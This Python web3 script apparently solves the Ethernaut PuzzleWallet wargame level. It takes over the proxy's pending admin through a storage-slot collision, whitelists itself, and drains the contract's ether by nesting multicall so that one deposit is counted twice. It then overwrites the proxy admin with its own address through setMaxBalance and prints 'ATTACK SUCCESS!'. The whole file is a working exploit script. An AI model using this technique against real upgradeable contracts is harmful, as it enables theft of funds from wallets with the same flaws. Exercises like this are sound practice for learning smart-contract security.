from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

def bytes_to_address(b: bytes) -> str:
    return web3.to_checksum_address("0x" + b.hex()[-40:])

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

PROXY_CONTRACT_ADDRESS = '0xF15d7507E038D7f9E1d9dA3CCfbdc772a40ba81b'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL24_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!\n")
else:
    print("Failed to connect to Network.\n")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

PROXY_CONTRACT_ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_admin",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "_implementation",
        "type": "address"
      },
      {
        "internalType": "bytes",
        "name": "_initData",
        "type": "bytes"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "pendingAdmin",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "admin",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_newAdmin",
        "type": "address"
      }
    ],
    "name": "proposeNewAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_expectedAdmin",
        "type": "address"
      }
    ],
    "name": "approveNewAdmin",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_newImplementation",
        "type": "address"
      }
    ],
    "name": "upgradeTo",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
]

LOGIC_CONTRACT_ABI = [
    {
        "type": "function",
        "name": "addToWhitelist",
        "inputs": [
            {
                "name": "addr",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0xe43252d7"
    },
    {
        "type": "function",
        "name": "balances",
        "inputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x27e235e3"
    },
    {
        "type": "function",
        "name": "deposit",
        "inputs": [],
        "outputs": [],
        "stateMutability": "payable",
        "payable": True,
        "signature": "0xd0e30db0"
    },
    {
        "type": "function",
        "name": "execute",
        "inputs": [
            {
                "name": "to",
                "type": "address",
                "internalType": "address"
            },
            {
                "name": "value",
                "type": "uint256",
                "internalType": "uint256"
            },
            {
                "name": "data",
                "type": "bytes",
                "internalType": "bytes"
            }
        ],
        "outputs": [],
        "stateMutability": "payable",
        "payable": True,
        "signature": "0xb61d27f6"
    },
    {
        "type": "function",
        "name": "init",
        "inputs": [
            {
                "name": "_maxBalance",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0xb7b0422d"
    },
    {
        "type": "function",
        "name": "maxBalance",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x73ad468a"
    },
    {
        "type": "function",
        "name": "multicall",
        "inputs": [
            {
                "name": "data",
                "type": "bytes[]",
                "internalType": "bytes[]"
            }
        ],
        "outputs": [],
        "stateMutability": "payable",
        "payable": True,
        "signature": "0xac9650d8"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    },
    {
        "type": "function",
        "name": "setMaxBalance",
        "inputs": [
            {
                "name": "_maxBalance",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0x9d51d9b7"
    },
    {
        "type": "function",
        "name": "whitelisted",
        "inputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "outputs": [
            {
                "name": "",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xd936547e"
    }
]

proxy_contract = web3.eth.contract(address=PROXY_CONTRACT_ADDRESS, abi=PROXY_CONTRACT_ABI)

LOGIC_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"

LOGIC_BYTES = web3.eth.get_storage_at(PROXY_CONTRACT_ADDRESS, LOGIC_SLOT)
LOGIC_ADDRESS = bytes_to_address(LOGIC_BYTES)

print(f"Logic Contract Address : {LOGIC_ADDRESS}\n")

print(f"---- GET User, PuzzleProxy, PuzzleWallet INFORMATION ----")

logic_contract = web3.eth.contract(address=PROXY_CONTRACT_ADDRESS, abi=LOGIC_CONTRACT_ABI)

PROXY_ADMIN = proxy_contract.functions.admin().call()
PROXY_PENDING_ADMIN = proxy_contract.functions.pendingAdmin().call()
WALLET_OWNER = logic_contract.functions.owner().call()
WALLET_MAX_BALANCE = logic_contract.functions.maxBalance().call()
WALLET_WHITELIST = logic_contract.functions.whitelisted(USER_ADDRESS).call()
WALLET_BALANCE = logic_contract.functions.balances(USER_ADDRESS).call()
USER_BALANCE = web3.eth.get_balance(USER_ADDRESS)
PROXY_BALANCE = web3.eth.get_balance(PROXY_CONTRACT_ADDRESS)
LOGIC_BALANCE = web3.eth.get_balance(LOGIC_ADDRESS)

print(f"User Address : {USER_ADDRESS}")
print(f"PuzzleProxy admin Address : {PROXY_ADMIN}")
print(f"PuzzleProxy pendingAdmin Address : {PROXY_PENDING_ADMIN}")
print(f"PuzzleWallet Owner Address : {WALLET_OWNER}")
print(f"PuzzleWallet maxBalance : {hex(WALLET_MAX_BALANCE)}")
print(f"PuzzleWallet whitelist[{USER_ADDRESS}] : {WALLET_WHITELIST}")
print(f"PuzzleWallet balances[{USER_ADDRESS}] : {WALLET_BALANCE}")
print(f"{USER_ADDRESS}.balance : {USER_BALANCE}")
print(f"{PROXY_CONTRACT_ADDRESS}.balance : {PROXY_BALANCE}")
print(f"{LOGIC_ADDRESS}.balance : {LOGIC_BALANCE}\n")

print(f"---- CHANGE PuzzleProxy pendingAdmin ADDRESS ----")
print(f"---- BEFORE TRANSACTION ----")

data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = proxy_contract.functions.proposeNewAdmin(USER_ADDRESS).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print(f"---- AFTER TRANSACTION ----")

PROXY_ADMIN = proxy_contract.functions.admin().call()
PROXY_PENDING_ADMIN = proxy_contract.functions.pendingAdmin().call()
WALLET_OWNER = logic_contract.functions.owner().call()
WALLET_MAX_BALANCE = logic_contract.functions.maxBalance().call()
WALLET_WHITELIST = logic_contract.functions.whitelisted(USER_ADDRESS).call()
WALLET_BALANCE = logic_contract.functions.balances(USER_ADDRESS).call()
USER_BALANCE = web3.eth.get_balance(USER_ADDRESS)
PROXY_BALANCE = web3.eth.get_balance(PROXY_CONTRACT_ADDRESS)
LOGIC_BALANCE = web3.eth.get_balance(LOGIC_ADDRESS)

print(f"User Address : {USER_ADDRESS}")
print(f"PuzzleProxy admin Address : {PROXY_ADMIN}")
print(f"PuzzleProxy pendingAdmin Address : {PROXY_PENDING_ADMIN}")
print(f"PuzzleWallet Owner Address : {WALLET_OWNER}")
print(f"PuzzleWallet maxBalance : {hex(WALLET_MAX_BALANCE)}")
print(f"PuzzleWallet whitelist[{USER_ADDRESS}] : {WALLET_WHITELIST}")
print(f"PuzzleWallet balances[{USER_ADDRESS}] : {WALLET_BALANCE}")
print(f"{USER_ADDRESS}.balance : {USER_BALANCE}")
print(f"{PROXY_CONTRACT_ADDRESS}.balance : {PROXY_BALANCE}")
print(f"{LOGIC_ADDRESS}.balance : {LOGIC_BALANCE}\n")

print(f"---- ADD Whitelists ADDRESS TO PuzzleWallet ----")
print(f"---- BEFORE TRANSACTION ----")

data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = logic_contract.functions.addToWhitelist(USER_ADDRESS).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print(f"---- AFTER TRANSACTION ----")

PROXY_ADMIN = proxy_contract.functions.admin().call()
PROXY_PENDING_ADMIN = proxy_contract.functions.pendingAdmin().call()
WALLET_OWNER = logic_contract.functions.owner().call()
WALLET_MAX_BALANCE = logic_contract.functions.maxBalance().call()
WALLET_WHITELIST = logic_contract.functions.whitelisted(USER_ADDRESS).call()
WALLET_BALANCE = logic_contract.functions.balances(USER_ADDRESS).call()
USER_BALANCE = web3.eth.get_balance(USER_ADDRESS)
PROXY_BALANCE = web3.eth.get_balance(PROXY_CONTRACT_ADDRESS)
LOGIC_BALANCE = web3.eth.get_balance(LOGIC_ADDRESS)

print(f"User Address : {USER_ADDRESS}")
print(f"PuzzleProxy admin Address : {PROXY_ADMIN}")
print(f"PuzzleProxy pendingAdmin Address : {PROXY_PENDING_ADMIN}")
print(f"PuzzleWallet Owner Address : {WALLET_OWNER}")
print(f"PuzzleWallet maxBalance : {hex(WALLET_MAX_BALANCE)}")
print(f"PuzzleWallet whitelist[{USER_ADDRESS}] : {WALLET_WHITELIST}")
print(f"PuzzleWallet balances[{USER_ADDRESS}] : {WALLET_BALANCE}")
print(f"{USER_ADDRESS}.balance : {USER_BALANCE}")
print(f"{PROXY_CONTRACT_ADDRESS}.balance : {PROXY_BALANCE}")
print(f"{LOGIC_ADDRESS}.balance : {LOGIC_BALANCE}\n")

print(f"---- CHANGE PuzzleProxy's Balance to 0 ----")
print(f"---- BEFORE TRANSACTION ----")

data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

CALLDATA_LIST = []

tx = logic_contract.functions.deposit().build_transaction(data)

CALLDATA_LIST.append(tx["data"])

tx = logic_contract.functions.multicall(CALLDATA_LIST).build_transaction(data)

CALLDATA_LIST = []

CALLDATA_LIST.append(tx["data"])

tx = logic_contract.functions.deposit().build_transaction(data)

CALLDATA_LIST.append(tx["data"])

tx = logic_contract.functions.execute(USER_ADDRESS, PROXY_BALANCE * 2, b"").build_transaction(data)

CALLDATA_LIST.append(tx["data"])

data = {
    'value': PROXY_BALANCE,
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = logic_contract.functions.multicall(CALLDATA_LIST).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print(f"---- AFTER TRANSACTION ----")

PROXY_ADMIN = proxy_contract.functions.admin().call()
PROXY_PENDING_ADMIN = proxy_contract.functions.pendingAdmin().call()
WALLET_OWNER = logic_contract.functions.owner().call()
WALLET_MAX_BALANCE = logic_contract.functions.maxBalance().call()
WALLET_WHITELIST = logic_contract.functions.whitelisted(USER_ADDRESS).call()
WALLET_BALANCE = logic_contract.functions.balances(USER_ADDRESS).call()
USER_BALANCE = web3.eth.get_balance(USER_ADDRESS)
PROXY_BALANCE = web3.eth.get_balance(PROXY_CONTRACT_ADDRESS)
LOGIC_BALANCE = web3.eth.get_balance(LOGIC_ADDRESS)

print(f"User Address : {USER_ADDRESS}")
print(f"PuzzleProxy admin Address : {PROXY_ADMIN}")
print(f"PuzzleProxy pendingAdmin Address : {PROXY_PENDING_ADMIN}")
print(f"PuzzleWallet Owner Address : {WALLET_OWNER}")
print(f"PuzzleWallet maxBalance : {hex(WALLET_MAX_BALANCE)}")
print(f"PuzzleWallet whitelist[{USER_ADDRESS}] : {WALLET_WHITELIST}")
print(f"PuzzleWallet balances[{USER_ADDRESS}] : {WALLET_BALANCE}")
print(f"{USER_ADDRESS}.balance : {USER_BALANCE}")
print(f"{PROXY_CONTRACT_ADDRESS}.balance : {PROXY_BALANCE}")
print(f"{LOGIC_ADDRESS}.balance : {LOGIC_BALANCE}\n")

print(f"---- CHANGE maxBalance TO CHANGE admin of ProxyWallet ----")
print(f"---- BEFORE TRANSACTION ----")

data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = logic_contract.functions.setMaxBalance(int(USER_ADDRESS, 0)).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}\n")

print(f"---- AFTER TRANSACTION ----")

PROXY_ADMIN = proxy_contract.functions.admin().call()
PROXY_PENDING_ADMIN = proxy_contract.functions.pendingAdmin().call()
WALLET_OWNER = logic_contract.functions.owner().call()
WALLET_MAX_BALANCE = logic_contract.functions.maxBalance().call()
WALLET_WHITELIST = logic_contract.functions.whitelisted(USER_ADDRESS).call()
WALLET_BALANCE = logic_contract.functions.balances(USER_ADDRESS).call()
USER_BALANCE = web3.eth.get_balance(USER_ADDRESS)
PROXY_BALANCE = web3.eth.get_balance(PROXY_CONTRACT_ADDRESS)
LOGIC_BALANCE = web3.eth.get_balance(LOGIC_ADDRESS)

print(f"User Address : {USER_ADDRESS}")
print(f"PuzzleProxy admin Address : {PROXY_ADMIN}")
print(f"PuzzleProxy pendingAdmin Address : {PROXY_PENDING_ADMIN}")
print(f"PuzzleWallet Owner Address : {WALLET_OWNER}")
print(f"PuzzleWallet maxBalance : {hex(WALLET_MAX_BALANCE)}")
print(f"PuzzleWallet whitelist[{USER_ADDRESS}] : {WALLET_WHITELIST}")
print(f"PuzzleWallet balances[{USER_ADDRESS}] : {WALLET_BALANCE}")
print(f"{USER_ADDRESS}.balance : {USER_BALANCE}")
print(f"{PROXY_CONTRACT_ADDRESS}.balance : {PROXY_BALANCE}")
print(f"{LOGIC_ADDRESS}.balance : {LOGIC_BALANCE}\n")

if USER_ADDRESS == PROXY_ADMIN:
  print("ATTACK SUCCESS!")
else:
  print("ATTACK FAILED...")
